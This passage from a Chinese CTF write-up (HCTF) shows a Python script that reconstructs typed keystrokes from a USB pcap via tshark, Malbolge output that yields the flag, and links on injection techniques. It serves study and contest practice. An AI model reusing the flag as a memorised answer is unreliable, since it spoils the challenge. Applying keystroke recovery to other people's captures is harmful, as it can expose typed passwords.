class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;~&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># check argv</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Usage : &quot;</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;        python UsbKeyboardHacker.py data.pcap&quot;</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Tips : &quot;</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;        To use this python script , you must install the tshark first.&quot;</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;        You can use `sudo apt-get install tshark` to install it&quot;</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Author : &quot;</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;        If you have any questions , please contact me by email.&quot;</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;        Thank you for using.&quot;</span></span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get argv</span></span><br><span class="line">    pcapFilePath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># get data of pcap</span></span><br><span class="line">    os.system(<span class="string">&quot;tshark -r %s -T fields -e usb.capdata &gt; %s&quot;</span> % (pcapFilePath, DataFileName))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># read data</span></span><br><span class="line">    <span class="keyword">with</span> open(DataFileName, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            presses.append(line[<span class="number">0</span>:<span class="number">-1</span>])</span><br><span class="line">    <span class="comment"># handle</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> press <span class="keyword">in</span> presses:</span><br><span class="line">        Bytes = press.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> Bytes[<span class="number">0</span>] == <span class="string">&quot;00&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">&quot;00&quot;</span>:</span><br><span class="line">                result += normalKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">elif</span> Bytes[<span class="number">0</span>] == <span class="string">&quot;02&quot;</span>: <span class="comment"># shift key is pressed.（error: 20）</span></span><br><span class="line">            <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">&quot;00&quot;</span>:</span><br><span class="line">                result += shiftKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;[-] Unknow Key : %s&quot;</span> % (Bytes[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;[+] Found : %s&quot;</span> % (result)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># clean the temp data</span></span><br><span class="line">    os.system(<span class="string">&quot;rm ./%s&quot;</span> % (DataFileName))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/1541917372520.png"></p><p>得到结果</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">D&#39;&#96;;M?!\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q&#x3D;|;)sxwYXtsl2pongOe+LKa&#39;e^]\a&#96;_X|V[Tx;:VONSRQJn1MFKJCBfFE&gt;&amp;&lt;&#96;@9!&#x3D;&lt;5Y9y7654-,P0&#x2F;o-,%I)ih&amp;%$#z@xw|&#123;ts9wvXWm3~</span><br></pre></td></tr></table></figure><p>看上去，像是一堆乱码，于是联系<code>difficult programming language</code>我搜索得到<code>malbolge</code>这种非常像乱码的变成语言。</p><p>于是找到一个在线编译网站<a href="http://malbolge.doleczek.pl/">Malbolge - interpreter online</a></p><p>并且在上面运行前面得到的代码，运行出来就得到flag了。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/1541917769366.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hctf&#123;m4lb0lGe&#125;</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>本次比赛让我了解到还有很多东西没有接触过或者没有完全弄懂，也有很多可惜之处、、、比如说Orderby注入，我是看过的，但是当时就是想不到，类似的例子还很多、、、</p><p>接下来的话，可能还是要继续努力啊、、现在还是菜的一批。</p><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p><strong>hideandseek</strong></p><p><a href="http://j4s0nh4ck.iteye.com/blog/2179350">软链接</a></p><p><a href="https://blog.csdn.net/li_101357/article/details/70118425">uuid 和 getnode()</a></p><p><a href="https://windard.com/blog/2017/10/17/Flask-Session">flask session</a> </p><p><strong>bootle</strong></p><p><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">Bottle HTTP 头注入漏洞探究</a> </p><p><a href="https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html">新浪某站CRLF Injection导致的安全问题</a></p><p><strong>Game</strong></p><p><a href="https://p0sec.net/index.php/archives/106/">orderby 盲注</a>    </p><p><strong>admin</strong></p><p><a href="https://paper.tuisec.win/detail/a9ad1440249d95b">Unicode安全</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参加HCTF，但是熬了两天也没什么输出==、真的体会到和真正的大佬之间的差距，在强大的表哥的带领下取得12名的成绩，我感觉还是很不错。只可惜</summary>
      
    
    
    
    <category term="CTF" scheme="v0w.top/categories/CTF/"/>
    
    
    <category term="RCE" scheme="v0w.top/tags/RCE/"/>
    
    <category term="XSS" scheme="v0w.top/tags/XSS/"/>
    
    <category term="SQL注入" scheme="v0w.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="伪造session" scheme="v0w.top/tags/%E4%BC%AA%E9%80%A0session/"/>
    
    <category term="CSRF" scheme="v0w.top/tags/CSRF/"/>
    
  </entry>
  
</feed>
